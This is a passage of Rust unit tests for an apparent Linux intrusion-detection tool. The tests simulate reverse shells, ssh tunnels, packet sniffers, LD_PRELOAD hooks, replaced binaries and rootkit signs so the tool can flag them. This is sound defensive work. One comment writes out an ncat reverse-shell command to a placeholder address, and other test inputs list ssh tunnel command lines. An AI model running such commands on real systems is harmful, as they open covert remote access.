                "/system.slice/sshd.service".to_string(),
                Some(Starter::System("sshd.service")),
            ),
            (
                "/system.slice/system-getty.slice/getty@tty1.service".into(),
                Some(Starter::System("getty@tty1.service")),
            ),
            // Below a system service the groups are that service's.
            (
                "/system.slice/docker.service/workers".into(),
                Some(Starter::System("docker.service")),
            ),
            (
                format!("{user}/app.slice/mpd.service"),
                Some(Starter::User("mpd.service")),
            ),
            (
                format!("{user}/session.slice/wayland-wm@hyprland.desktop.service"),
                Some(Starter::User("wayland-wm@hyprland.desktop.service")),
            ),
            // An app or terminal the desktop started, and whatever its
            // user makes below one.
            (
                format!(
                    "{user}/app.slice/app-graphical.slice/app-Hyprland-xdg\\x2dterminal\\x2dexec-3dbb5f0d.scope"
                ),
                None,
            ),
            (format!("{user}/app.slice/run-u55.scope/mpd.service"), None),
            (format!("{user}/app.slice/odd/mpd.service"), None),
            // The managers' own groups and a login session.
            (format!("{user}/init.scope"), None),
            (user.to_string(), None),
            ("/user.slice/user-1000.slice/session-2.scope".into(), None),
            ("/init.scope".into(), None),
            (String::new(), None),
        ] {
            assert_eq!(starter(&cgroup), expected, "{cgroup}");
        }

        let (dir, index) = system(
            "live-starter",
            &[
                ("usr/bin/mpd", "mpd"),
                ("usr/bin/nginx", "nginx"),
                ("usr/bin/crond", "crond"),
                (
                    "usr/lib/systemd/system/user@.service",
                    "[Service]\nExecStart=/usr/lib/systemd/systemd --user\n",
                ),
                (
                    "usr/lib/systemd/system/nginx.service",
                    "[Service]\nExecStart=/usr/bin/nginx\n",
                ),
                (
                    "usr/lib/systemd/system/cronie.service",
                    "[Service]\nExecStart=/usr/bin/crond -n\n",
                ),
                (
                    "usr/lib/systemd/user/mpd.service",
                    "[Service]\nExecStart=/usr/bin/mpd --systemd\n",
                ),
            ],
        );
        let scope = Scope {
            root: dir.path(),
            home: None,
            index: &index,
            origin: Origin::System,
        };
        let vouched = |exe: &str, cgroup: &str| {
            started_by_packaged_unit(
                &scope,
                &super::Process {
                    exe: exe.to_string(),
                    cgroup: cgroup.to_string(),
                    ..Default::default()
                },
            )
        };
        let app = format!("{user}/app.slice/app-Hyprland-kitty-77.scope");
        // The user manager's packaged template vouches for nothing that
        // runs in a session, and a group named like a unit below a scope
        // is the user's own making.
        assert!(!vouched("/usr/bin/nginx", &app));
        assert!(!vouched("/usr/bin/mpd", &format!("{app}/mpd.service")));
        assert!(!vouched("/usr/bin/nginx", &format!("{user}/init.scope")));
        assert!(vouched("/usr/bin/nginx", "/system.slice/nginx.service"));
        assert!(vouched(
            "/usr/bin/mpd",
            "/system.slice/nginx.service/workers"
        ));
        // A user's unit must name the program, in its own group or below.
        let mpd = format!("{user}/app.slice/mpd.service");
        assert!(vouched("/usr/bin/mpd", &mpd));
        assert!(vouched("/usr/bin/mpd", &format!("{mpd}/sub")));
        assert!(!vouched("/usr/bin/nginx", &mpd));
        // What cron runs for a user is in cron's group, and is not cron.
        assert!(vouched("/usr/bin/crond", "/system.slice/cronie.service"));
        assert!(!vouched("/usr/bin/nginx", "/system.slice/cronie.service"));
    }

    #[test]
    fn a_listening_module_is_named_by_the_file_python_runs_for_it() {
        let server = "usr/lib/python3.14/http/server.py";
        let (dir, index) = system(
            "live-module",
            &[("usr/bin/python3.14", "python"), (server, "stdlib")],
        );
        let root = dir.path();
        symlink("python3.14", root.join("usr/bin/python3")).unwrap();
        fs::create_dir_all(root.join("home/u/work")).unwrap();
        // A module of the same name where the process was started.
        write(root, "tmp/x/http/server.py", "not the stdlib's");
        let any = "00000000";
        let none = "00000000:0000";
        let mut sockets = Vec::new();
        for (pid, cwd, arguments, inode, port) in [
            (
                "30",
                "/home/u/work",
                "python3 -m http.server 8000",
                "800",
                "1F40",
            ),
            ("31", "/tmp/x", "python3 -m http.server 8000", "801", "1F41"),
            (
                "32",
                "/home/u/work",
                "python3 -um other 8002",
                "802",
                "1F42",
            ),
            ("33", "/home/u", "python3 -m other 8003", "803", "1F43"),
        ] {
            let socket = format!("socket:[{inode}]");
            process(
                root,
                pid,
                "/usr/bin/python3.14",
                &[("0", "/dev/null"), ("3", &socket)],
                "",
            );
            detail(root, pid, "cmdline", &arguments.replace(' ', "\0"));
            symlink(cwd, root.join("proc").join(pid).join("cwd")).unwrap();
            sockets.push((format!("{any}:{port}"), inode));
        }
        let rows: Vec<(&str, &str, &str, &str)> = sockets
            .iter()
            .map(|(local, inode)| (local.as_str(), none, "0A", *inode))
            .collect();
        table(root, "tcp", &rows);
        let live = look(root, &index, Origin::System);
        let found = listed(&live);
        let listener = RuleId::NetworkListener;
        // The interpreter's own module is the item, by its file: what is
        // allowed is that file's content on that port.
        assert!(
            found.contains(&("usr/lib/python3.14/http/server.py:tcp-8000", vec![listener])),
            "{found:?}"
        );
        let own = live
            .items
            .iter()
            .find(|item| item.path.starts_with(server))
            .unwrap();
        assert_eq!(own.sha256, Some(Sha256::digest(b"stdlib")));
        // The same command line where a module of that name lies beside
        // it is another item, and says what it takes the place of.
        assert!(
            found.contains(&("tmp/x/http/server.py:tcp-8001", vec![listener])),
            "{found:?}"
        );
        assert!(
            found.contains(&(
                "tmp/x/http/server.py",
                vec![RuleId::PathHijack, RuleId::RunningFromTemp]
            )),
            "{found:?}"
        );
        // A module that cannot be found is named with where the process
        // was started: the same name elsewhere is another item.
        let unresolved: Vec<&str> = found
            .iter()
            .map(|(path, _)| *path)
            .filter(|path| path.contains(":other:cwd-"))
            .collect();
        assert_eq!(unresolved.len(), 2, "{found:?}");
        assert_ne!(unresolved[0], unresolved[1]);
        assert!(unresolved[0].starts_with("usr/bin/python3.14:tcp-8002:other:cwd-"));
    }

    #[test]
    fn a_module_is_named_only_where_the_file_python_runs_is_certain() {
        let server = "usr/lib/python3.14/http/server.py";
        let (dir, index) = system(
            "live-module-certain",
            &[("usr/bin/python3.14", "python"), (server, "stdlib")],
        );
        let root = dir.path();
        symlink("python3.14", root.join("usr/bin/python3")).unwrap();
        fs::create_dir_all(root.join("home/u/work")).unwrap();
        let scope = Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        };
        let module = |cwd: &str, environment: &str| {
            let python = running(
                "/usr/bin/python3",
                &["python3", "-m", "http.server"],
                Some(cwd),
                environment,
            );
            super::module_of(&scope, &python, "usr/bin/python3")
                .unwrap()
                .file
        };
        assert_eq!(module("home/u/work", "").as_deref(), Some(server));
        assert_eq!(module("home/u/work", "PYTHONPATH=/tmp/x;"), None);
        write(root, "home/u/work/http/other.py", "part of the name");
        assert_eq!(module("home/u/work", ""), None);
        let script = running(
            "/usr/bin/python3",
            &["python3", "x.py", "-m", "y"],
            None,
            "",
        );
        assert_eq!(super::module_of(&scope, &script, "usr/bin/python3"), None);

        // Root, led by a process into a directory not everyone may enter,
        // names no file whether or not the module's name is in there: the
        // answer would tell the process's user what the directory holds.
        let as_root = Scope {
            origin: Origin::Root,
            ..scope
        };
        let rooted = |cwd: &str| {
            let python = running(
                "/usr/bin/python3",
                &["python3", "-m", "http.server"],
                Some(cwd),
                "",
            );
            super::module_of(&as_root, &python, "usr/bin/python3")
                .unwrap()
                .file
        };
        fs::create_dir_all(root.join("home/u/open")).unwrap();
        assert_eq!(rooted("home/u/open").as_deref(), Some(server));
        for closed in ["home/u/closed", "home/u/closed-with"] {
            fs::create_dir_all(root.join(closed)).unwrap();
        }
        write(root, "home/u/closed-with/http.py", "in the way");
        for closed in ["home/u/closed", "home/u/closed-with"] {
            fs::set_permissions(root.join(closed), fs::Permissions::from_mode(0o700)).unwrap();
            assert_eq!(rooted(closed), None, "{closed}");
        }
        // One everyone may enter is looked into, directories included.
        fs::create_dir_all(root.join("home/u/open/http")).unwrap();
        assert_eq!(rooted("home/u/open"), None);
    }

    #[test]
    fn a_listening_socket_no_process_holds_is_a_finding_for_root() {
        let (dir, index) = listening_system();
        let root = dir.path();
        // Root sees every process: a socket none holds is the kernel's
        // own where a module that serves files is loaded, and else a
        // sign of a hidden process.
        let about = |live: &super::Live| -> Vec<RuleId> {
            live.items
                .iter()
                .filter(|item| item.path == "proc/net/tcp:31337")
                .flat_map(|item| item.alerts.iter().map(|(rule, _)| *rule))
                .collect()
        };
        assert_eq!(
            about(&look(root, &index, Origin::Root)),
            [RuleId::RootkitSign]
        );
        write(root, "proc/modules", "nfsd 1 0 - Live 0x0\n");
        let live = look(root, &index, Origin::Root);
        assert!(about(&live).is_empty());
        assert!(
            live.notes
                .iter()
                .any(|note| note.contains("the kernel's own")),
            "{:?}",
            live.notes
        );
    }

    #[test]
    fn a_tunnel_and_a_server_with_its_own_settings_are_told_apart() {
        use super::net::{forwards, own_settings};
        let words = |line: &'static str| -> Vec<&'static str> { line.split(' ').collect() };
        for line in [
            "ssh -R 8080:localhost:80 host",
            "ssh -fNR 8080:localhost:80 host",
            "ssh -D 1080 host",
            "ssh -N -w0:0 host",
            "ssh -o RemoteForward=8080 host",
            "ssh -oDynamicForward=1080 host",
        ] {
            assert!(forwards(&words(line)), "{line}");
        }
        for line in [
            "ssh host",
            "ssh -i /home/u/.ssh/Raw_Deploy host",
            "ssh -oProxyCommand=Relay host",
            "ssh -vvv -p 22 -l Dana host",
            "ssh -L 8080:localhost:80 host",
        ] {
            assert!(!forwards(&words(line)), "{line}");
        }
        for line in [
            "sshd -f /tmp/cfg",
            "sshd -f/home/u/cfg",
            "/usr/bin/sshd -D -p 2222",
            "sshd -o PermitRootLogin=yes",
        ] {
            assert!(own_settings(&words(line)), "{line}");
        }
        for line in [
            "sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups",
            "sshd -D -f /etc/ssh/sshd_config",
        ] {
            assert!(!own_settings(&words(line)), "{line}");
        }
    }

    #[test]
    fn a_tunnel_started_from_no_terminal_and_a_connected_relay_are_said() {
        let (dir, index) = system(
            "live-relays",
            &[("usr/bin/ssh", "ssh"), ("usr/bin/ncat", "ncat")],
        );
        let root = dir.path();
        let tunnel = "ssh -N -R 8080:localhost:80 host";
        process(
            root,
            "30",
            "/usr/bin/ssh",
            &[("0", "/dev/null"), ("3", "socket:[800]")],
            "",
        );
        detail(root, "30", "cmdline", &tunnel.replace(' ', "\0"));
        // The same, typed at a terminal.
        process(
            root,
            "31",
            "/usr/bin/ssh",
            &[("0", "/dev/pts/3"), ("3", "socket:[801]")],
            "",
        );
        detail(root, "31", "cmdline", &tunnel.replace(' ', "\0"));
        // `ncat -e /bin/bash 198.51.100.7 4444`, and one to this machine.
        process(root, "32", "/usr/bin/ncat", &[("3", "socket:[802]")], "");
        process(root, "33", "/usr/bin/ncat", &[("3", "socket:[803]")], "");
        let here = "0200A8C0:D431";
        table(
            root,
            "tcp",
            &[
                (here, "057100CB:0016", "01", "800"),
                (here, "057100CB:0016", "01", "801"),
                (here, "076433C6:115C", "01", "802"),
                ("0100007F:D431", "0100007F:115C", "01", "803"),
            ],
        );
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [
                ("usr/bin/ncat:to-198.51.100.7", vec![RuleId::NetworkRelay]),
                ("usr/bin/ssh:to-203.0.113.5", vec![RuleId::NetworkRelay]),
            ]
        );
    }

    #[test]
    fn every_check_knows_the_same_shells_and_interpreters() {
        let (dir, index) = system(
            "live-programs",
            &[
                ("usr/bin/mksh", "mksh"),
                ("usr/bin/elvish", "elvish"),
                ("usr/bin/nu", "nu"),
                ("usr/bin/ash", "ash"),
                ("usr/bin/busybox", "busybox"),
                ("usr/bin/nc.openbsd", "nc"),
            ],
        );
        let root = dir.path();
        for path in ["home/u/spy", "home/u/run.sh"] {
            write(root, path, path);
        }
        let status = |pid: &str, name: &str, tracer: u32| {
            detail(
                root,
                pid,
                "status",
                &format!(
                    "Name:\t{name}\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t1\nTracerPid:\t{tracer}\n"
                ),
            );
        };
        // Something attached to a shell the tracing check did not know.
        process(root, "40", "/usr/bin/mksh", &[], "");
        status("40", "mksh", 41);
        process(root, "41", "/home/u/spy", &[], "");
        status("41", "spy", 0);
        // A shell at a terminal that holds a connection: one the
        // connection check did not know, and one with a client of its own,
        // which is reported once the connection is its input and output.
        let held = |pid: &str, exe: &str, inode: &str| {
            let socket = format!("socket:[{inode}]");
            process(root, pid, exe, &[("0", "/dev/pts/1"), ("3", &socket)], "");
        };
        held("42", "/usr/bin/elvish", "900");
        held("43", "/usr/bin/nu", "901");
        let socket = "socket:[902]";
        process(
            root,
            "44",
            "/usr/bin/nu",
            &[("0", socket), ("1", socket), ("2", socket)],
            "",
        );
        let here = "0200A8C0:D431";
        table(
            root,
            "tcp",
            &[
                (here, "076433C6:115C", "01", "900"),
                (here, "076433C6:115C", "01", "901"),
                (here, "057100CB:01BB", "01", "902"),
            ],
        );
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [
                ("home/u/spy:attached-to-mksh", vec![RuleId::TracedSecrets]),
                ("usr/bin/elvish:to-198.51.100.7", vec![RuleId::RemoteShell]),
                ("usr/bin/nu:to-203.0.113.5", vec![RuleId::RemoteShell]),
            ]
        );

        // A shell the live checks did not count as an interpreter is named
        // by its script; so is a multi-call program run as a shell, which
        // is a relay too. A netcat is named by itself.
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        for (exe, arguments, subject) in [
            ("usr/bin/ash", ["ash", "/home/u/run.sh"], "home/u/run.sh"),
            ("usr/bin/busybox", ["sh", "/home/u/run.sh"], "home/u/run.sh"),
            (
                "usr/bin/nc.openbsd",
                ["nc.openbsd", "/home/u/run.sh"],
                "usr/bin/nc.openbsd",
            ),
        ] {
            assert!(super::is_interpreter(exe), "{exe}");
            let process = running(&format!("/{exe}"), &arguments, None, "");
            assert_eq!(super::subject(&scope, &process, exe).0, subject, "{exe}");
        }
    }

    #[test]
    fn raw_packet_sockets_and_promiscuous_interfaces_are_looked_at() {
        let (dir, index) = system(
            "live-packets",
            &[
                ("usr/bin/NetworkManager", "nm"),
                ("usr/bin/python3", "python"),
            ],
        );
        let root = dir.path();
        write(root, "home/u/sniff", "sniffer");
        process(
            root,
            "40",
            "/usr/bin/NetworkManager",
            &[("9", "socket:[900]")],
            "",
        );
        process(root, "41", "/home/u/sniff", &[("3", "socket:[901]")], "");
        write(
            root,
            "proc/net/packet",
            "sk               RefCnt Type Proto  Iface R Rmem   User   Inode\n0000000040c08707 3      2    890d   2     1 0      0      900\n00000000a81581b0 3      3    0003   0     1 0      1000   901\n0000000020f7362c 3      2    0806   2     1 0      0      902\n",
        );
        write(root, "sys/class/net/eth0/flags", "0x1103\n");
        write(root, "sys/class/net/lo/flags", "0x9\n");
        // A bridge's port is promiscuous by design.
        write(root, "sys/class/net/veth0/flags", "0x1103\n");
        write(root, "sys/class/net/veth0/brport/state", "3\n");
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [("home/u/sniff:packet-socket", vec![RuleId::KernelTap])]
        );
        let promiscuous: Vec<&String> = live
            .notes
            .iter()
            .filter(|note| note.contains("promiscuous"))
            .collect();
        assert_eq!(promiscuous.len(), 1, "{promiscuous:?}");
        assert!(promiscuous[0].contains("eth0"));
        // Root sees every process: a socket none of them holds is said.
        let live = look(root, &index, Origin::Root);
        assert!(
            live.items
                .iter()
                .any(|item| item.path == "proc/net/packet"
                    && item.alerts[0].0 == RuleId::KernelTap)
        );
    }

    #[test]
    fn a_deleted_program_is_checked_whatever_is_at_its_path_now() {
        let (dir, index) = system("live-decoy", &[("usr/bin/hyprland", "compositor")]);
        let root = dir.path();
        // It started, deleted itself and left a harmless file behind.
        write(root, "home/u/.cache/x", "decoy");
        process(
            root,
            "40",
            "/home/u/.cache/x (deleted)",
            &[("3", "/dev/input/event0"), ("4", "socket:[800]")],
            "LD_PRELOAD=/home/u/.hook.so;",
        );
        write(root, "home/u/.hook.so", "hook");
        table(
            root,
            "tcp",
            &[("00000000:15B3", "00000000:0000", "0A", "800")],
        );
        let live = look(root, &index, Origin::System);
        let item = live
            .items
            .iter()
            .find(|item| item.path == "home/u/.cache/x")
            .unwrap();
        let alerts: Vec<RuleId> = item.alerts.iter().map(|(rule, _)| *rule).collect();
        assert_eq!(
            alerts,
            [
                RuleId::HiddenProgram,
                RuleId::RunningFromTemp,
                RuleId::KeyboardReader,
                RuleId::NetworkListener
            ]
        );
        // The decoy's content does not pass for the program's.
        assert!(item.sha256.is_none());
        assert!(
            live.items.iter().any(|item| item.path == "home/u/.hook.so"
                && item.alerts[0].0 == RuleId::PreloadedLibrary)
        );
    }

    #[test]
    fn a_name_that_ends_like_a_deleted_one_is_told_from_a_deleted_file() {
        use std::process::{Command, Stdio};
        if !crate::test_support::tool_available("/usr/bin/sleep") {
            return;
        }
        let dir = TempDir::new("live-deleted");
        let run = |name: &str| {
            let program = dir.path().join(name);
            fs::copy("/usr/bin/sleep", &program).unwrap();
            let child = Command::new(&program)
                .arg("60")
                .stdout(Stdio::null())
                .spawn()
                .unwrap();
            (program, child)
        };
        let (gone, mut deleted) = run("gone");
        let (_, mut named) = run("named (deleted)");
        // Deleted under its name while a second name keeps the file.
        let (twice, mut linked) = run("twice");
        fs::hard_link(&twice, dir.path().join("kept")).unwrap();
        fs::remove_file(&gone).unwrap();
        fs::remove_file(&twice).unwrap();
        let running = super::processes(Path::new("/proc"));
        let seen = |pid: u32| {
            running
                .processes
                .iter()
                .find(|process| process.number() == pid)
                .map(|process| (process.deleted, process.name().to_string()))
        };
        let results = [seen(deleted.id()), seen(named.id()), seen(linked.id())];
        for child in [&mut deleted, &mut named, &mut linked] {
            child.kill().unwrap();
            child.wait().unwrap();
        }
        assert_eq!(
            results,
            [
                Some((true, "gone".to_string())),
                Some((false, "named (deleted)".to_string())),
                Some((true, "twice".to_string())),
            ]
        );
    }

    /// A system where a running program, a preloaded library and a loaded
    /// module were replaced where their packages put them, next to ones
    /// that were not; and modules the kernel marks.
    fn replaced_system() -> (TempDir, PackageIndex) {
        let (dir, mut index) = system(
            "live-content",
            &[
                ("usr/bin/daemon", "daemon"),
                ("usr/bin/ok", "ok"),
                ("usr/lib/libgood.so", "library"),
                ("usr/lib/libfine.so", "fine"),
                ("usr/lib/modules/6.1-test/pkgbase", "linux\n"),
                ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
                ("usr/lib/modules/6.1-test/kernel/b.ko.zst", "module b"),
            ],
        );
        let root = dir.path();
        installed_by(
            &mut index,
            "nvidia-open",
            &[("usr/lib/modules/6.1-test/extramodules/nv.ko.zst", "nv")],
        );
        installed_by(
            &mut index,
            "odd",
            &[("usr/lib/modules/6.1-test/extramodules/odd.ko.zst", "odd")],
        );
        write(
            root,
            "usr/lib/modules/6.1-test/extramodules/nv.ko.zst",
            "nv",
        );
        write(
            root,
            "usr/lib/modules/6.1-test/extramodules/odd.ko.zst",
            "odd",
        );
        // Replaced where their packages put them.
        write(root, "usr/bin/daemon", "trojan");
        write(root, "usr/lib/libgood.so", "hooked");
        write(root, "usr/lib/modules/6.1-test/kernel/a.ko.zst", "rootkit");
        process(
            root,
            "50",
            "/usr/bin/daemon",
            &[("3", "/dev/input/event0")],
            "",
        );
        process(
            root,
            "51",
            "/usr/bin/ok",
            &[("3", "/dev/input/event0")],
            "LD_PRELOAD=/usr/lib/libgood.so:/usr/lib/libfine.so;",
        );
        write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
        write(
            root,
            "usr/lib/modules/6.1-test/modules.dep",
            "kernel/a.ko.zst:\nkernel/b.ko.zst:\nextramodules/nv.ko.zst:\nextramodules/odd.ko.zst:\n",
        );
        write(
            root,
            "proc/modules",
            "a 1 0 - Live 0x0\nb 1 0 - Live 0x0\nnv 1 0 - Live 0x0\nodd 1 0 - Live 0x0\n",
        );
        // What the kernel says of each module it loaded.
        write(root, "sys/module/a/taint", "\n");
        write(root, "sys/module/b/taint", "E\n");
        write(root, "sys/module/nv/taint", "POE\n");
        write(root, "sys/module/odd/taint", "OE\n");
        write(root, "proc/sys/kernel/tainted", "12289\n");
        (dir, index)
    }

    #[test]
    fn a_packaged_path_is_trusted_for_its_content_only() {
        let (dir, index) = replaced_system();
        let live = look(dir.path(), &index, Origin::System);
        let seen: Vec<(&str, &str, Vec<RuleId>)> = live
            .items
            .iter()
            .filter(|item| !item.is_trusted())
            .map(|item| {
                (
                    item.path.as_str(),
                    item.tier.name(),
                    item.alerts.iter().map(|(rule, _)| *rule).collect(),
                )
            })
            .collect();
        let module = RuleId::UnknownKernelModule;
        assert_eq!(
            seen,
            [
                // Judged like a program no package installed.
                ("usr/bin/daemon", "modified", vec![RuleId::KeyboardReader]),
                (
                    "usr/lib/libgood.so",
                    "modified",
                    vec![RuleId::PreloadedLibrary]
                ),
                (
                    "usr/lib/modules/6.1-test/extramodules/odd.ko.zst",
                    "package",
                    vec![module]
                ),
                (
                    "usr/lib/modules/6.1-test/kernel/a.ko.zst",
                    "modified",
                    vec![module]
                ),
                (
                    "usr/lib/modules/6.1-test/kernel/b.ko.zst",
                    "package",
                    vec![module]
                ),
            ]
        );
    }

    #[test]
    fn a_packaged_program_closed_to_readers_is_still_compared() {
        use std::os::unix::fs::MetadataExt;
        let (dir, mut index) = system(
            "live-closed",
            &[("usr/bin/shut", "shut"), ("usr/bin/same", "same")],
        );
        let root = dir.path();
        // Root reads everything: there is no closed file to play.
        if fs::metadata(root).unwrap().uid() == 0 {
            return;
        }
        // One its package installs for root alone, as `cupsd` is.
        index.add_for_test(
            "own",
            &format!(
                "#mtree\n./usr/bin/private type=file mode=700 sha256digest={}\n",
                Sha256::digest(b"private")
            ),
            &[],
        );
        write(root, "usr/bin/private", "private");
        write(root, "usr/bin/shut", "trojan");
        let close = |path: &str, mode: u32| {
            fs::set_permissions(root.join(path), fs::Permissions::from_mode(mode)).unwrap();
        };
        for (pid, name) in [("60", "shut"), ("61", "same"), ("62", "private")] {
            close(&format!("usr/bin/{name}"), 0o700);
            let exe = format!("/usr/bin/{name}");
            process(root, pid, &exe, &[("3", "/dev/input/event0")], "");
        }
        let live = look(root, &index, Origin::Root);
        let keys = vec![RuleId::KeyboardReader];
        // The changed one is not trusted for its path, and neither is one
        // somebody closed; what the package ships closed is compared too,
        // and is as installed.
        assert_eq!(
            listed(&live),
            [
                ("usr/bin/same", keys.clone()),
                ("usr/bin/shut", keys.clone())
            ]
        );
        for item in &live.items {
            assert_eq!(item.tier.name(), "modified", "{}", item.path);
            // Nothing of the content of a file not everyone may read.
            assert_eq!(item.sha256, None, "{}", item.path);
            assert_eq!(item.body, Body::Binary(crate::sweep::collect::COMPARED));
            assert!(
                item.notes
                    .contains(&crate::sweep::collect::CLOSED.to_string()),
                "{:?}",
                item.notes
            );
        }
        // The path must be the package's own, reached with no link on the
        // way: anything else a process names stays unseen.
        let scope = Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::Root,
        };
        symlink("usr/bin", root.join("bin")).unwrap();
        let item = crate::sweep::collect::packaged_item;
        assert!(item(&scope, Category::Process, "usr/bin/shut").is_some());
        assert!(item(&scope, Category::Process, "bin/shut").is_none());
        write(root, "usr/bin/unowned", "x");
        close("usr/bin/unowned", 0o700);
        assert!(item(&scope, Category::Process, "usr/bin/unowned").is_none());
        fs::remove_file(root.join("usr/bin/unowned")).unwrap();

        // The user's own sweep cannot read a closed file. One its package
        // ships readable is told as closed; one shipped closed is taken on
        // its path's word, as before.
        for name in ["shut", "same", "private"] {
            close(&format!("usr/bin/{name}"), 0o000);
        }
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [("usr/bin/same", keys.clone()), ("usr/bin/shut", keys)]
        );
        assert!(live.items.iter().all(|item| {
            item.tier.name() == "modified"
                && item
                    .notes
                    .contains(&crate::sweep::collect::CLOSED.to_string())
        }));
        for name in ["shut", "same", "private"] {
            close(&format!("usr/bin/{name}"), 0o700);
        }
    }

    #[test]
    fn a_packaged_path_in_a_closed_directory_tells_one_bit_or_nothing() {
        use std::os::unix::fs::MetadataExt;
        let (dir, mut index) = system("live-out-of-sight", &[("usr/bin/same", "same")]);
        let root = dir.path();
        if fs::metadata(root).unwrap().uid() == 0 {
            return;
        }
        // A package's libraries in a directory of root's alone: one that
        // is as installed, one changed, one missing, one that is a
        // directory now. And a missing one where everyone may look.
        let entry = |path: &str, text: &str| {
            format!(
                "./{path} type=file mode=600 sha256digest={}\n",
                Sha256::digest(text.as_bytes())
            )
        };
        let closed =
            ["same", "changed", "gone", "odd"].map(|name| format!("usr/lib/shut/{name}.so"));
        let mut mtree = String::from("#mtree\n");
        for path in &closed {
            mtree.push_str(&entry(path, "library"));
        }
        mtree.push_str(&entry("usr/lib/open.so", "library"));
        index.add_for_test("libs", &mtree, &[]);
        write(root, "usr/lib/shut/same.so", "library");
        write(root, "usr/lib/shut/changed.so", "trojan");
        fs::create_dir_all(root.join("usr/lib/shut/odd.so")).unwrap();
        for file in ["same", "changed"] {
            let path = root.join(format!("usr/lib/shut/{file}.so"));
            fs::set_permissions(path, fs::Permissions::from_mode(0o600)).unwrap();
        }
        fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o700)).unwrap();
        let preload = format!(
            "LD_PRELOAD=/{}:/usr/lib/open.so:/usr/lib/shut/unowned.so",
            closed.join(":/")
        );
        process(root, "70", "/usr/bin/same", &[], &preload);
        let live = look(root, &index, Origin::Root);
        let named: Vec<(&str, &str)> = live
            .items
            .iter()
            .filter(|item| item.path.starts_with("usr/lib/"))
            .map(|item| (item.path.as_str(), item.tier.name()))
            .collect();
        // The changed one is told, the intact one is not, and neither are
        // the two that would say what the closed directory holds. A path
        // no package owns, and one in a directory anyone may list, are
        // told as before.
        assert_eq!(
            named.iter().map(|(path, _)| *path).collect::<Vec<_>>(),
            [
                "usr/lib/open.so",
                "usr/lib/shut/changed.so",
                "usr/lib/shut/unowned.so"
            ],
            "{named:?}"
        );
        assert_eq!(named[1].1, "modified");
        let scope = Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::Root,
        };
        let unseen = crate::sweep::collect::packaged_out_of_sight;
        assert!(unseen(&scope, "usr/lib/shut/gone.so"));
        assert!(!unseen(&scope, "usr/lib/shut/unowned.so"));
        assert!(!unseen(&scope, "usr/lib/open.so"));
        // A directory somebody else may write is not root's alone.
        fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o720)).unwrap();
        assert!(!unseen(&scope, "usr/lib/shut/gone.so"));
        fs::set_permissions(root.join("usr/lib/shut"), fs::Permissions::from_mode(0o700)).unwrap();
    }

    #[test]
    fn what_no_package_owns_where_programs_are_loaded_from_is_listed() {
        let (dir, mut index) = system(
            "live-installed",
            &[
                ("usr/bin/ls", "ls"),
                ("usr/bin/cat", "cat"),
                ("usr/lib/libc.so.6", "libc"),
                ("usr/lib/libz.so.1", "libz"),
                ("usr/lib/security/pam_unix.so", "pam"),
                ("usr/lib/systemd/systemd", "systemd"),
                ("usr/lib/modules/6.1-test/pkgbase", "linux\n"),
                ("usr/lib/modules/6.1-test/vmlinuz", "kernel"),
                ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
            ],
        );
        let root = dir.path();
        index.add_for_test(
            "links",
            "#mtree\n./usr/bin/sh type=link link=bash\n./usr/bin/awk type=link link=gawk\n",
            &[],
        );
        symlink("bash", root.join("usr/bin/sh")).unwrap();
        // A packaged link that leads elsewhere now.
        symlink("/home/u/evil", root.join("usr/bin/awk")).unwrap();
        // Changed where their packages put them.
        write(root, "usr/bin/cat", "trojan");
        write(root, "usr/lib/libz.so.1", "hooked");
        write(root, "usr/lib/modules/6.1-test/vmlinuz", "other kernel");
        // No package's.
        write(root, "usr/bin/stray", "stray");
        write(root, "usr/lib/libstray.so", "stray");
        write(root, "usr/lib/security/pam_stray.so", "stray");
        write(root, "usr/lib/systemd/systemd-stray", "stray");
        write(root, "usr/lib/modules/6.1-test/kernel/stray.ko", "stray");
        // Not a library, and what depmod and DKMS make.
        write(root, "usr/lib/os-release", "NAME=x");
        write(
            root,
            "usr/lib/modules/6.1-test/modules.dep",
            "kernel/a.ko.zst:\n",
        );
        write(
            root,
            "usr/lib/modules/6.1-test/updates/dkms/v.ko.zst",
            "built",
        );
        fs::create_dir_all(root.join("var/lib/dkms")).unwrap();
        write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
        let live = look(root, &index, Origin::System);
        let seen: Vec<(&str, Category, &str)> = live
            .items
            .iter()
            .map(|item| (item.path.as_str(), item.category, item.tier.name()))
            .collect();
        let modules = "usr/lib/modules/6.1-test";
        assert_eq!(
            seen,
            [
                ("usr/bin/awk", Category::Program, "modified"),
                ("usr/bin/cat", Category::Program, "modified"),
                ("usr/bin/stray", Category::Program, "unknown"),
                ("usr/lib/libstray.so", Category::Linker, "unknown"),
                ("usr/lib/libz.so.1", Category::Linker, "modified"),
                (
                    &*format!("{modules}/kernel/stray.ko"),
                    Category::Kernel,
                    "unknown"
                ),
                (&*format!("{modules}/vmlinuz"), Category::Kernel, "modified"),
                ("usr/lib/security/pam_stray.so", Category::Pam, "unknown"),
                (
                    "usr/lib/systemd/systemd-stray",
                    Category::Systemd,
                    "unknown"
                ),
            ]
        );
        // After a kernel update the running kernel's modules are not the
        // installed package's: nothing is said of them.
        fs::remove_file(root.join(modules).join("pkgbase")).unwrap();
        let live = look(root, &index, Origin::System);
        assert!(!live.items.iter().any(|item| item.path.starts_with(modules)));
        // From root these files come as a hash, not with their content.
        let content = |origin: Origin| {
            let live = look(root, &index, origin);
            let stray = live
                .items
                .iter()
                .find(|item| item.path == "usr/bin/stray")
                .unwrap();
            assert!(stray.sha256.is_some());
            stray.body.clone()
        };
        assert_eq!(content(Origin::System), Body::Text("stray".into()));
        assert_eq!(
            content(Origin::Root),
            Body::Binary(crate::sweep::collect::WITHHELD)
        );
    }

    #[test]
